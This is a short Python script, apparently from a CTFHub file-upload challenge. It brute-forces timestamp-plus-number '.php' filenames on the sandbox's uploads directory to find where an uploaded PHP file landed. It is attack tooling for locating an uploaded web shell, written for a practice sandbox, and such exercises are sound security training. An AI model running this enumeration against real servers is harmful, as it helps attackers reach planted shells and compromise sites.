# 找随机数生成的文件名网址
import requests

url = 'http://challenge-42adb3152625b12d.sandbox.ctfhub.com:10800/uploads/'
time = '20211024032734'
for i in range(1000):
    url_file = url+time+str(i)+'.php'
    res = requests.get(url=url_file)
    if res.status_code==200:
        print(url_file)